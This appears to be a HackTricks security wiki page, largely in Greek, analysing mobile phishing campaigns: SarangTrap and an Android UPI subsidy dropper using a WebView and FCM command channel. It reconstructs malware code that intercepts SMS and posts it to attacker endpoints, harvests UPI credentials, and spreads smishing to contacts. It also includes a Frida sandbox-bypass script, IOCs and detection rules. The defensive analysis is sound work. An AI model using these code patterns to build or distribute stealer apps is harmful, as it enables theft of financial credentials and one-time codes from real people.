# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι απειλητικοί παράγοντες για να διανείμουν **κακόβουλα Android APKs** και **προφίλ κινητής διαμόρφωσης iOS** μέσω phishing (SEO, κοινωνική μηχανική, ψεύτικα καταστήματα, εφαρμογές γνωριμιών κ.λπ.).
> Το υλικό έχει προσαρμοστεί από την καμπάνια SarangTrap που αποκαλύφθηκε από την Zimperium zLabs (2025) και άλλες δημόσιες έρευνες.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Καταχωρήστε δεκάδες τομείς που μοιάζουν (γνωριμίες, cloud share, υπηρεσία αυτοκινήτου…).
– Χρησιμοποιήστε τοπικές λέξεις-κλειδιά και emojis στο στοιχείο `<title>` για να κατατάξετε στο Google.
– Φιλοξενήστε *και τις δύο* οδηγίες εγκατάστασης Android (`.apk`) και iOS στην ίδια σελίδα προορισμού.
2. **First Stage Download**
* Android: άμεσος σύνδεσμος σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλός σύνδεσμος HTTPS σε ένα κακόβουλο **mobileconfig** προφίλ (βλ. παρακάτω).
3. **Post-install Social Engineering**
* Στην πρώτη εκτέλεση, η εφαρμογή ζητά έναν **κωδικό πρόσκλησης / επαλήθευσης** (ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κωδικός **POSTed over HTTP** στο Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το κακόβουλο λογισμικό συνεχίζει.
* Η δυναμική ανάλυση Sandbox / AV που δεν υποβάλλει έγκυρο κωδικό δεν βλέπει **κακόβουλη συμπεριφορά** (αποφυγή).
4. **Runtime Permission Abuse** (Android)
* Επικίνδυνες άδειες ζητούνται μόνο **μετά από θετική απάντηση C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Οι παλαιότερες εκδόσεις ζητούσαν επίσης άδειες SMS -->
```
* Οι πρόσφατες παραλλαγές **αφαιρούν το `<uses-permission>` για SMS από το `AndroidManifest.xml`** αλλά αφήνουν τη διαδρομή κώδικα Java/Kotlin που διαβάζει SMS μέσω reflection ⇒ μειώνει τη στατική βαθμολογία ενώ παραμένει λειτουργική σε συσκευές που παρέχουν την άδεια μέσω κακής χρήσης `AppOps` ή παλαιών στόχων.
5. **Facade UI & Background Collection**
* Η εφαρμογή εμφανίζει αβλαβείς προβολές (SMS viewer, gallery picker) που έχουν υλοποιηθεί τοπικά.
* Εν τω μεταξύ, εξάγει:
- IMEI / IMSI, αριθμό τηλεφώνου
- Πλήρη εξαγωγή `ContactsContract` (JSON array)
- JPEG/PNG από `/sdcard/DCIM` συμπιεσμένα με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό περιεχόμενο SMS (`content://sms`)
Τα payloads είναι **batch-zipped** και αποστέλλονται μέσω `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Ένα μόνο **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγραφεί η συσκευή σε “MDM”-όμοια εποπτεία.
* Οδηγίες κοινωνικής μηχανικής:
1. Ανοίξτε τις Ρυθμίσεις ➜ *Προφίλ κατεβασμένο*.
2. Πατήστε *Εγκατάσταση* τρεις φορές (σκορπιές στην σελίδα phishing).
3. Εμπιστευτείτε το unsigned προφίλ ➜ ο επιτιθέμενος αποκτά *Contacts* & *Photo* δικαιώματα χωρίς έλεγχο από το App Store.
7. **Network Layer**
* Απλό HTTP, συχνά στη θύρα 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολο να εντοπιστεί).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση κακόβουλου λογισμικού, αυτοματοποιήστε τη φάση κωδικού πρόσκλησης με Frida/Objection για να φτάσετε στον κακόβουλο κλάδο.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με runtime `PackageManager#getRequestedPermissions()`; η έλλειψη επικίνδυνων αδειών είναι κόκκινη σημαία.
* **Network Canary** – Ρυθμίστε `iptables -p tcp --dport 80 -j NFQUEUE` για να ανιχνεύσετε μη σταθερές εκρήξεις POST μετά την είσοδο κωδικού.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` σε macOS για να καταγράψετε το `PayloadContent` και να εντοπίσετε υπερβολικά δικαιώματα.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** για να πιάσετε ξαφνικές εκρήξεις τομέων πλούσιων σε λέξεις-κλειδιά.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` από πελάτες Dalvik εκτός Google Play.
* **Invite-code Telemetry** – POST 6–8 ψηφιακών κωδικών λίγο μετά την εγκατάσταση APK μπορεί να υποδηλώνει προετοιμασία.
* **MobileConfig Signing** – Αποκλείστε unsigned προφίλ διαμόρφωσης μέσω πολιτικής MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Δείκτες (Γενικοί)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Αυτό το μοτίβο έχει παρατηρηθεί σε καμπάνιες που εκμεταλλεύονται θέματα κυβερνητικών επιδομάτων για να κλέψουν διαπιστευτήρια UPI και OTP από την Ινδία. Οι χειριστές συνδυάζουν αξιόπιστες πλατφόρμες για παράδοση και ανθεκτικότητα.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ανακάλυψη δυναμικών σημείων μέσω συντομευμένων συνδέσμων
- Το κακόβουλο λογισμικό ανακτά μια λίστα ζωντανών σημείων σε απλό κείμενο, διαχωρισμένη με κόμματα από έναν συντομευμένο σύνδεσμο; απλές μετατροπές συμβολοσειρών παράγουν τη τελική διαδρομή της σελίδας phishing.

Παράδειγμα (καθαρισμένο):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Το βήμα “Κάντε πληρωμή ₹1 / UPI‑Lite” φορτώνει μια HTML φόρμα του επιτιθέμενου από το δυναμικό endpoint μέσα σε ένα WebView και καταγράφει ευαίσθητα πεδία (τηλέφωνο, τράπεζα, UPI PIN) τα οποία `POST`άρονται στο `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Αυτο-διάδοση και παρεμβολή SMS/OTP
- Ζητούνται επιθετικές άδειες κατά την πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές συνδέονται για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Τα εισερχόμενα SMS παγιδεύονται από έναν δέκτη εκπομπής και ανεβαίνουν με μεταδεδομένα (αποστολέας, περιεχόμενο, θύρα SIM, τυχαίο ID ανά συσκευή) στο `/addsm.php`.

Σχέδιο δέκτη:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) ως ανθεκτικό C2
- Το payload εγγράφεται στο FCM; τα μηνύματα push περιέχουν ένα πεδίο `_type` που χρησιμοποιείται ως διακόπτης για την ενεργοποίηση ενεργειών (π.χ., ενημέρωση προτύπων κειμένου phishing, εναλλαγή συμπεριφορών).

Παράδειγμα payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Σχέδιο χειριστή:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- Το APK περιέχει δευτερεύον φορτίο στο `assets/app.apk`
- Το WebView φορτώνει πληρωμή από το `gate.htm` και εξάγει σε `/addup.php`
- Εξαγωγή SMS σε `/addsm.php`
- Fetch ρυθμίσεων μέσω συντομεύσεων (π.χ., `rebrand.ly/*`) που επιστρέφουν CSV endpoints
- Εφαρμογές που χαρακτηρίζονται ως γενικές “Ενημέρωση/Ασφαλής Ενημέρωση”
- FCM `data` μηνύματα με διακριτικό `_type` σε μη αξιόπιστες εφαρμογές

### Detection & defence ideas
- Σημειώστε εφαρμογές που δίνουν οδηγίες στους χρήστες να απενεργοποιήσουν το δίκτυο κατά την εγκατάσταση και στη συνέχεια να φορτώσουν μια δεύτερη APK από το `assets/`.
- Ειδοποιήστε για το tuple δικαιωμάτων: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + ροές πληρωμών βασισμένες σε WebView.
- Παρακολούθηση εξόδου για `POST /addup.php|/addsm.php` σε μη εταιρικούς διακομιστές; αποκλείστε γνωστή υποδομή.
- Κανόνες Mobile EDR: μη αξιόπιστη εφαρμογή που εγγράφεται για FCM και διακλαδίζεται σε πεδίο `_type`.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
